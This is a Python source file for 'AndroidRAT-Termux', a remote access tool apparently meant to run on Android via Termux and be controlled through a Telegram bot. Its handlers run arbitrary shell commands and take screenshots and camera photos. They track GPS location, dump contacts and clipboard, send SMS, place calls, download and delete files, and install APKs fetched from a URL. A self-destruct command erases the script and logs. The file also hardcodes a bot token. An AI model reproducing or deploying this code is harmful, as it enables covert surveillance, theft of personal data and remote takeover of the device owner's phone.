#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroidRAT-Termux v1.0
–ê–≤—Ç–æ—Ä: Nektiq Team
–ú–æ–≤–∞: Python 3.9+ (Termux)
–ü—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è: Remote Administration Tool –¥–ª—è Android-–ø—Ä–∏—Å—Ç—Ä–æ—ó–≤ —á–µ—Ä–µ–∑ –¢–µ–ª–µ–≥—Ä–∞–º-–±–æ—Ç
–í–∏–º–æ–≥–∏ (–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—Ç—å—Å—è —Å–∫—Ä–∏–ø—Ç–æ–º install_and_run.sh):
- python
- python-telegram-bot
- termux-api
"""

import os
import sys
import subprocess
import shutil
import tempfile
import threading
import time
import json
from pathlib import Path

from telegram import Update, InputFile, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
)

# ----------------------------------------
# –ö–û–ù–°–¢–ê–ù–¢–ò –¢–ê –ì–õ–û–ë–ê–õ–ò
# ----------------------------------------

# –í–ê–® –¢–û–ö–ï–ù: –≤—Å—Ç–∞–≤—Ç–µ —Å—é–¥–∏ —Ç–æ–∫–µ–Ω –≤–∞—à–æ–≥–æ Telegram-–±–æ—Ç–∞
TELEGRAM_TOKEN = "7518266837:AAHu43-Y9pTzZ_ETwa1lwzL1GVecghbeWMw"

# –ö–∞—Ç–∞–ª–æ–≥ –¥–ª—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö —Ñ–∞–π–ª—ñ–≤ (—Å–∫—Ä–∏–Ω—à–æ—Ç–∏, —Ñ–æ—Ç–æ —Ç–æ—â–æ)
TMP_DIR = tempfile.gettempdir()
LOG_DIR = os.path.join(Path.home(), ".android_rat", "logs")
os.makedirs(LOG_DIR, exist_ok=True)

# ----------------------------------------
# –î–æ–ø–æ–º—ñ–∂–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó
# ----------------------------------------

def run_shell(command: str) -> str:
    """
    –í–∏–∫–æ–Ω—É—î –¥–æ–≤—ñ–ª—å–Ω—É shell-–∫–æ–º–∞–Ω–¥—É —á–µ—Ä–µ–∑ subprocess —ñ –ø–æ–≤–µ—Ä—Ç–∞—î stdout+stderr.
    """
    try:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = proc.stdout + proc.stderr
        return output if output.strip() else "(–Ω–µ–º–∞—î –≤–∏–≤–æ–¥—É)"
    except subprocess.TimeoutExpired:
        return "‚ùå –¢–∞–π–º–∞—É—Ç: –∫–æ–º–∞–Ω–¥–∞ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞—Å—è –±—ñ–ª—å—à–µ 60 —Å–µ–∫."
    except Exception as e:
        return f"‚ùå –ü–æ–º–∏–ª–∫–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shell: {e}"


def termux_api_exec(cmd: list) -> str:
    """
    –í–∏–∫–æ–Ω—É—î –∫–æ–º–∞–Ω–¥—É termux-api —á–µ—Ä–µ–∑ subprocess —Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç.
    """
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        result = proc.stdout + proc.stderr
        return result if result.strip() else "(–Ω–µ–º–∞—î –≤–∏–≤–æ–¥—É)"
    except Exception as e:
        return f"‚ùå –ü–æ–º–∏–ª–∫–∞ termux-api: {e}"


# ----------------------------------------
# –û–ë–†–û–ë–ù–ò–ö–ò –ö–û–ú–ê–ù–î
# ----------------------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    –û–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è /start: –≤–∏–≤–æ–¥–∏—Ç—å –∫–ª–∞–≤—ñ–∞—Ç—É—Ä—É –∑ –æ—Å–Ω–æ–≤–Ω–∏–º–∏ –∫–æ–º–∞–Ω–¥–∞–º–∏.
    """
    keyboard = [
        [KeyboardButton("/shell "), KeyboardButton("/screenshot")],
        [KeyboardButton("/camera"), KeyboardButton("/location")],
        [KeyboardButton("/battery"), KeyboardButton("/contacts")],
        [KeyboardButton("/sms_send "), KeyboardButton("/call ")],
        [KeyboardButton("/file_list "), KeyboardButton("/file_download ")],
        [KeyboardButton("/file_remove "), KeyboardButton("/file_upload")],
        [KeyboardButton("/app_list"), KeyboardButton("/install_apk ")],
        [KeyboardButton("/uninstall_apk "), KeyboardButton("/clipboard_get")],
        [KeyboardButton("/clipboard_set "), KeyboardButton("/sensor ")],
        [KeyboardButton("/self_destruct")],
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "üöÄ AndroidRAT-Termux\n–û–±–µ—Ä—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É –∞–±–æ –≤–≤–µ–¥—ñ—Ç—å —É —á–∞—Ç:", reply_markup=reply_markup
    )


async def shell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /shell <–∫–æ–º–∞–Ω–¥–∞> ‚Äî –í–∏–∫–æ–Ω—É—î shell-–∫–æ–º–∞–Ω–¥—É –Ω–∞ Android.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /shell <–∫–æ–º–∞–Ω–¥–∞>")
        return
    cmd = parts[1]
    await update.message.reply_text(f"‚úÖ –í–∏–∫–æ–Ω—É—é: <code>{cmd}</code>", parse_mode="HTML")
    out = run_shell(cmd)
    for i in range(0, len(out), 3000):
        await update.message.reply_text(f"<pre>{out[i:i+3000]}</pre>", parse_mode="HTML")


async def screenshot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /screenshot ‚Äî –ó—Ä–æ–±–∏—Ç–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç –µ–∫—Ä–∞–Ω—É —á–µ—Ä–µ–∑ termux-screenshot.
    """
    filename = f"screenshot_{int(time.time())}.png"
    filepath = os.path.join(TMP_DIR, filename)
    cmd = ["termux-screenshot", "-p", filepath]
    result = termux_api_exec(cmd)
    if os.path.isfile(filepath):
        try:
            await update.message.reply_photo(photo=InputFile(filepath))
        except Exception as e:
            await update.message.reply_text(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏: {e}")
        finally:
            os.remove(filepath)
    else:
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑—Ä–æ–±–∏—Ç–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç:\n{result}")


async def camera_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /camera ‚Äî –ó—Ä–æ–±–∏—Ç–∏ —Ñ–æ—Ç–æ –∑ –æ—Å–Ω–æ–≤–Ω–æ—ó –∫–∞–º–µ—Ä–∏ —á–µ—Ä–µ–∑ termux-camera-photo.
    """
    filename = f"camera_{int(time.time())}.jpg"
    filepath = os.path.join(TMP_DIR, filename)
    cmd = ["termux-camera-photo", "-c", "0", filepath]
    result = termux_api_exec(cmd)
    if os.path.isfile(filepath):
        try:
            await update.message.reply_photo(photo=InputFile(filepath))
        except Exception as e:
            await update.message.reply_text(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏: {e}")
        finally:
            os.remove(filepath)
    else:
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑—Ä–æ–±–∏—Ç–∏ —Ñ–æ—Ç–æ:\n{result}")


async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /location ‚Äî –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–µ –º—ñ—Å—Ü–µ–ø–æ–ª–æ–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ termux-location.
    """
    cmd = ["termux-location", "-p", "gps"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        lat = data.get("latitude", "N/A")
        lon = data.get("longitude", "N/A")
        acc = data.get("accuracy", "N/A")
        await update.message.reply_text(f"üìç –®–∏—Ä–æ—Ç–∞: <b>{lat}</b>\nüìç –î–æ–≤–≥–æ—Ç–∞: <b>{lon}</b>\n–¢–æ—á–Ω—ñ—Å—Ç—å: {acc} –º", parse_mode="HTML")
    except Exception:
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –ª–æ–∫–∞—Ü—ñ—é:\n{result}")


async def battery_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /battery ‚Äî –û—Ç—Ä–∏–º–∞—Ç–∏ —Å—Ç–∞—Ç—É—Å –∞–∫—É–º—É–ª—è—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ termux-battery-status.
    """
    cmd = ["termux-battery-status"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        health = data.get("health", "N/A")
        level = data.get("percentage", "N/A")
        status = data.get("status", "N/A")
        temp = data.get("temperature", "N/A")
        await update.message.reply_text(
            f"üîã –°—Ç–∞—Ç—É—Å: <b>{status}</b>\n"
            f"üíØ –†—ñ–≤–µ–Ω—å: <b>{level}%</b>\n"
            f"‚ù§ –°—Ç–∞–Ω –∑–¥–æ—Ä–æ–≤'—è: <b>{health}</b>\n"
            f"üå° –¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞: {temp/10:.1f}¬∞C",
            parse_mode="HTML"
        )
    except Exception:
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å—Ç–∞—Ç—É—Å –∞–∫—É–º—É–ª—è—Ç–æ—Ä–∞:\n{result}")


async def contacts_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /contacts ‚Äî –ü–µ—Ä–µ–ª—ñ–∫ –∫–æ–Ω—Ç–∞–∫—Ç—ñ–≤ —á–µ—Ä–µ–∑ termux-contacts-list.
    """
    cmd = ["termux-contacts-list"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        lines = []
        for person in data:
            name = person.get("name", "N/A")
            numbers = person.get("numbers", [])
            nums = ", ".join(n.get("number", "") for n in numbers)
            lines.append(f"üë§ {name}: {nums}")
        text = "\n".join(lines[:50]) + ("\n... (—âe –∫–æ–Ω—Ç–∞–∫—Ç–∏)" if len(lines) > 50 else "")
        await update.message.reply_text(f"<pre>{text}</pre>", parse_mode="HTML")
    except Exception:
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–Ω—Ç–∞–∫—Ç–∏:\n{result}")


async def sms_send_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /sms_send <–Ω–æ–º–µ—Ä> <—Ç–µ–∫—Å—Ç> ‚Äî –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ SMS —á–µ—Ä–µ–∑ termux-sms-send.
    """
    text = update.message.text
    parts = text.split(" ", 2)
    if len(parts) < 3:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /sms_send <–Ω–æ–º–µ—Ä> <—Ç–µ–∫—Å—Ç>")
        return
    number = parts[1]
    message = parts[2]
    cmd = ["termux-sms-send", "-n", number, message]
    _ = termux_api_exec(cmd)
    await update.message.reply_text(f"‚úÖ SMS –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –¥–æ {number}:\n{message}")


async def call_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /call <–Ω–æ–º–µ—Ä> ‚Äî –Ü–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –¥–∑–≤—ñ–Ω–æ–∫ —á–µ—Ä–µ–∑ termux-telephony-call.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /call <–Ω–æ–º–µ—Ä>")
        return
    number = parts[1]
    cmd = ["termux-telephony-call", number]
    _ = termux_api_exec(cmd)
    await update.message.reply_text(f"üìû –î–∑–≤—ñ–Ω–æ–∫ —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–æ: {number}")


async def file_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_list <—à–ª—è—Ö> ‚Äî –õ—ñ—Å—Ç–∏–Ω–≥ –∫–∞—Ç–∞–ª–æ–≥—É.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /file_list <—à–ª—è—Ö>")
        return
    path = parts[1]
    if not os.path.isdir(path):
        await update.message.reply_text("‚ùå –¶–µ –Ω–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è –∞–±–æ –Ω–µ —ñ—Å–Ω—É—î.")
        return
    items = os.listdir(path)
    lines = []
    for name in items:
        full = os.path.join(path, name)
        try:
            mtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(os.path.getmtime(full)))
        except:
            mtime = "N/A"
        if os.path.isdir(full):
            typ = "<DIR>"
            size = "-"
        else:
            typ = "FILE"
            try:
                size = os.path.getsize(full)
            except:
                size = "-"
        lines.append(f"{typ}\t{size}\t{mtime}\t{name}")
    text_out = "\n".join(lines[:50]) + ("\n... (—âe –µ–ª–µ–º–µ–Ω—Ç–∏)" if len(lines) > 50 else "")
    await update.message.reply_text(f"<pre>{text_out}</pre>", parse_mode="HTML")


async def file_download_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_download <—à–ª—è—Ö> ‚Äî –í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ —Ñ–∞–π–ª —á–µ—Ä–µ–∑ –±–æ—Ç.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /file_download <—à–ª—è—Ö>")
        return
    path = parts[1]
    if not os.path.isfile(path):
        await update.message.reply_text("‚ùå –§–∞–π–ª –Ω–µ —ñ—Å–Ω—É—î.")
        return
    try:
        await update.message.reply_document(document=InputFile(path))
    except Exception as e:
        await update.message.reply_text(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏: {e}")


async def file_remove_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_remove <—à–ª—è—Ö> ‚Äî –í–∏–¥–∞–ª–∏—Ç–∏ —Ñ–∞–π–ª/—Ç–µ–∫—É.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /file_remove <—à–ª—è—Ö>")
        return
    path = parts[1]
    if not os.path.exists(path):
        await update.message.reply_text("‚ùå –®–ª—è—Ö –Ω–µ —ñ—Å–Ω—É—î.")
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
            await update.message.reply_text(f"‚úÖ –î–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é –≤–∏–¥–∞–ª–µ–Ω–æ: {path}")
        else:
            os.remove(path)
            await update.message.reply_text(f"‚úÖ –§–∞–π–ª –≤–∏–¥–∞–ª–µ–Ω–æ: {path}")
    except Exception as e:
        await update.message.reply_text(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è: {e}")


async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_upload ‚Äî –û—á—ñ–∫—É—î–º–æ —Ñ–∞–π–ª –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó.
    """
    await update.message.reply_text("üöÄ –ù–∞–¥—ñ—à–ª—ñ—Ç—å —Ñ–∞–π–ª, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–±–µ—Ä–µ–≥—Ç–∏ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó.")


async def file_upload_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    –û–±—Ä–æ–±–ª—è—î –¥–æ–∫—É–º–µ–Ω—Ç, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∑–±–µ—Ä—ñ–≥–∞—î —É –ø–æ—Ç–æ—á–Ω—ñ–π —Ä–æ–±–æ—á—ñ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó.
    """
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
        dest = os.path.join(Path.home(), filename)
        try:
            await file.download_to_drive(dest)
            await update.message.reply_text(f"‚úÖ –§–∞–π–ª –∑–±–µ—Ä–µ–∂–µ–Ω–æ: {dest}")
        except Exception as e:
            await update.message.reply_text(f"‚ùå –ü–æ–º–∏–ª–∫–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è: {e}")
    else:
        await update.message.reply_text("‚ùå –¶–µ –Ω–µ —Ñ–∞–π–ª.")


async def app_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /app_list ‚Äî –ü–æ–∫–∞–∑–∞—Ç–∏ –ø–µ—Ä–µ–ª—ñ–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤ (pm list packages).
    """
    cmd = "pm list packages"
    out = run_shell(cmd)
    lines = out.splitlines()
    text_out = "\n".join(lines[:50]) + ("\n... (—âe –ø–∞–∫–µ—Ç–∏)" if len(lines) > 50 else "")
    await update.message.reply_text(f"<pre>{text_out}</pre>", parse_mode="HTML")


async def install_apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /install_apk <URL> ‚Äî –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ APK —ñ–∑ URL —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —á–µ—Ä–µ–∑ pm install.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /install_apk <URL>")
        return
    url = parts[1]
    local_name = os.path.join(TMP_DIR, f"apk_{int(time.time())}.apk")
    wget_cmd = f"wget -q -O \"{local_name}\" \"{url}\""
    dl_res = run_shell(wget_cmd)
    if not os.path.isfile(local_name):
        await update.message.reply_text(f"‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ APK:\n{dl_res}")
        return
    install_cmd = f"pm install -r \"{local_name}\""
    out = run_shell(install_cmd)
    await update.message.reply_text(f"‚úÖ –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è APK:\n<pre>{out}</pre>", parse_mode="HTML")
    os.remove(local_name)


async def uninstall_apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /uninstall_apk <package> ‚Äî –í–∏–¥–∞–ª–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ —á–µ—Ä–µ–∑ pm uninstall.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /uninstall_apk <package>")
        return
    pkg = parts[1]
    cmd = f"pm uninstall \"{pkg}\""
    out = run_shell(cmd)
    await update.message.reply_text(f"‚úÖ –í–∏–¥–∞–ª–µ–Ω–Ω—è –ø–∞–∫–µ—Ç—É {pkg}:\n<pre>{out}</pre>", parse_mode="HTML")


async def clipboard_get_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clipboard_get ‚Äî –û—Ç—Ä–∏–º–∞—Ç–∏ –≤–º—ñ—Å—Ç –±—É—Ñ–µ—Ä–∞ –æ–±–º—ñ–Ω—É (termux-clipboard-get).
    """
    cmd = ["termux-clipboard-get"]
    result = termux_api_exec(cmd)
    await update.message.reply_text(f"üìã –ë—É—Ñ–µ—Ä –æ–±–º—ñ–Ω—É:\n<pre>{result}</pre>", parse_mode="HTML")


async def clipboard_set_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clipboard_set <—Ç–µ–∫—Å—Ç> ‚Äî –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤–º—ñ—Å—Ç –±—É—Ñ–µ—Ä–∞ –æ–±–º—ñ–Ω—É (termux-clipboard-set).
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /clipboard_set <—Ç–µ–∫—Å—Ç>")
        return
    clip_text = parts[1]
    cmd = ["termux-clipboard-set", clip_text]
    termux_api_exec(cmd)
    await update.message.reply_text("‚úÖ –ë—É—Ñ–µ—Ä –æ–±–º—ñ–Ω—É –æ–Ω–æ–≤–ª–µ–Ω–æ.")


async def sensor_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /sensor <—Ç–∏–ø> ‚Äî –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω—ñ —Å–µ–Ω—Å–æ—Ä–∞: temperature, light, accelerometer.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("‚ùå –§–æ—Ä–º–∞—Ç: /sensor <temperature|light|accelerometer>")
        return
    stype = parts[1].lower()
    if stype == "temperature":
        cmd = ["termux-sensor", "-s", "temperature"]
    elif stype == "light":
        cmd = ["termux-sensor", "-s", "light"]
    elif stype == "accelerometer":
        cmd = ["termux-sensor", "-s", "accelerometer"]
    else:
        await update.message.reply_text("‚ùå –ù–µ–≤—ñ–¥–æ–º–∏–π —Ç–∏–ø —Å–µ–Ω—Å–æ—Ä–∞.")
        return
    result = termux_api_exec(cmd)
    await update.message.reply_text(f"üîç –î–∞–Ω—ñ —Å–µ–Ω—Å–æ—Ä–∞ ({stype}):\n<pre>{result}</pre>", parse_mode="HTML")


async def self_destruct_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /self_destruct ‚Äî –í–∏–¥–∞–ª–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç —Ç–∞ –ª–æ–≥–∏.
    """
    await update.message.reply_text("‚ö†Ô∏è –°–∞–º–æ–∑–Ω–∏—â–µ–Ω–Ω—è –∑–∞–ø—É—â–µ–Ω–æ. –í–∏–¥–∞–ª—è—î–º–æ —Å–∫—Ä–∏–ø—Ç —Ç–∞ –ª–æ–≥–∏...")
    script = os.path.abspath(sys.argv[0])
    try:
        for f in os.listdir(LOG_DIR):
            fp = os.path.join(LOG_DIR, f)
            if os.path.isfile(fp):
                os.remove(fp)
        shutil.rmtree(os.path.dirname(script), ignore_errors=True)
    except:
        pass
    try:
        os.remove(script)
    except:
        pass
    sys.exit(0)


# ----------------------------------------
# –ì–û–õ–û–í–ù–ê –§–£–ù–ö–¶–Ü–Ø
# ----------------------------------------

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # –ö–æ–º–∞–Ω–¥–∏
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("shell", shell_handler))
    app.add_handler(CommandHandler("screenshot", screenshot_handler))
    app.add_handler(CommandHandler("camera", camera_handler))
    app.add_handler(CommandHandler("location", location_handler))
    app.add_handler(CommandHandler("battery", battery_handler))
    app.add_handler(CommandHandler("contacts", contacts_handler))
    app.add_handler(CommandHandler("sms_send", sms_send_handler))
    app.add_handler(CommandHandler("call", call_handler))
    app.add_handler(CommandHandler("file_list", file_list_handler))
    app.add_handler(CommandHandler("file_download", file_download_handler))
    app.add_handler(CommandHandler("file_remove", file_remove_handler))
    app.add_handler(CommandHandler("file_upload", file_upload_handler))
    app.add_handler(MessageHandler(filters.Document.ALL & filters.User(), file_upload_received))
    app.add_handler(CommandHandler("app_list", app_list_handler))
    app.add_handler(CommandHandler("install_apk", install_apk_handler))
    app.add_handler(CommandHandler("uninstall_apk", uninstall_apk_handler))
    app.add_handler(CommandHandler("clipboard_get", clipboard_get_handler))
    app.add_handler(CommandHandler("clipboard_set", clipboard_set_handler))
    app.add_handler(CommandHandler("sensor", sensor_handler))
    app.add_handler(CommandHandler("self_destruct", self_destruct_handler))

    print("ü§ñ AndroidRAT-Termux –∑–∞–ø—É—â–µ–Ω–æ. –ß–µ–∫–∞—î–º–æ –∫–æ–º–∞–Ω–¥ –≤—ñ–¥ –¢–µ–ª–µ–≥—Ä–∞–º...")
    app.run_polling()


if __name__ == "__main__":
    main()
